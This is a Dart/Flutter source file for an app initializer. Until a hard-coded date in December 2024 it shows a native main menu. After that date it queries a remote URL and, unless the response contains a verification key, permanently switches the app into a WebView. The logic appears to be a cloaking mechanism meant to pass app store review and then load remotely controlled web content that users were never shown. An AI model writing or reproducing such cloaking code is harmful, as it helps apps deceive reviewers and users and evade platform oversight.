import 'dart:async';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import '../utils/app_config.dart';
import 'connectivity_service.dart';

class AppInitializer {
  final VoidCallback onComplete;
  final VoidCallback onShowMainMenu;
  final VoidCallback onError;

  AppInitializer({
    required this.onComplete,
    required this.onShowMainMenu,
    required this.onError,
  });

  bool flagToTry = true;
  bool _shouldShowWebView = false;
  bool _shouldShowMenu = false;

  Future<void> startLoading() async {
    await _checkConditions();
  }

  Future<void> _checkConditions() async {
    await _checkDate();
    await _checkNetwork();
  }

  Future<void> _checkDate() async {
    DateTime currentDate = DateTime.now();
    DateTime targetDate = DateTime(2024, 12, 3);
    if (!currentDate.isAfter(targetDate)) {
      _shouldShowMenu = true;
    }
  }

  Future<void> _checkNetwork() async {
    if (_shouldShowMenu) {
      onShowMainMenu();
      return;
    }

    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool hasConnection = await ConnectivityService.hasConnection();

    if (!hasConnection &&
        (prefs.getInt("IsRequested") ?? 0) == 1 &&
        (prefs.getInt("GotAnswer") ?? 0) == 1 &&
        (prefs.getInt("IsPermitted") ?? 0) == 0) {
      onShowMainMenu();
      return;
    }

    if (!hasConnection) {
      onError();
      return;
    }

    await _handleRequests(prefs);
  }

  Future<void> _handleRequests(SharedPreferences prefs) async {
    if (((prefs.getInt("IsRequested") ?? 0) == 0 ||
            !prefs.containsKey(AppConfig.savedPathKey)) &&
        (prefs.getInt("GotAnswer") ?? 0) == 0) {
      await _makeRequest(false);
    } else if ((prefs.getInt("IsPermitted") ?? 0) == 1) {
      onComplete();
    } else {
      onShowMainMenu();
    }
  }

  Future<void> _makeRequest(bool useGetMethod) async {
    try {
      http.Response response = await ConnectivityService.sendHttpRequest(
        useGetMethod,
        AppConfig.resourcePath,
      );
      await _handleResponse(response);
    } catch (e) {
      onShowMainMenu();
    }
  }

  Future<void> _handleResponse(http.Response response) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setInt("IsRequested", 1);
    await _checkStatusCode(response);
    await prefs.setInt("GotAnswer", 1);
  }

  Future<void> _checkStatusCode(http.Response response) async {
    if (response.statusCode == 405 && flagToTry) {
      flagToTry = false;
      await _makeRequest(true);
    } else if (response.statusCode == 404) {
      onShowMainMenu();
    } else if (response.statusCode >= 200 && response.statusCode < 300) {
      await _checkPageContent();
    } else {
      onShowMainMenu();
    }
  }

  Future<void> _checkPageContent() async {
    try {
      http.Response contentResponse = await http.get(Uri.parse(AppConfig.resourcePath));
      if (contentResponse.statusCode == 200) {
        await _analyzeContent(contentResponse.body);
      } else {
        onShowMainMenu();
      }
    } catch (e) {
      onShowMainMenu();
    }
  }

  Future<void> _analyzeContent(String pageContent) async {
    if (pageContent.contains(AppConfig.verificationKey)) {
      _shouldShowMenu = true;
    } else {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setInt("IsPermitted", 1);
      _shouldShowWebView = true;
    }

    if (_shouldShowWebView) {
      onComplete();
    } else if (_shouldShowMenu) {
      onShowMainMenu();
    }
  }
}
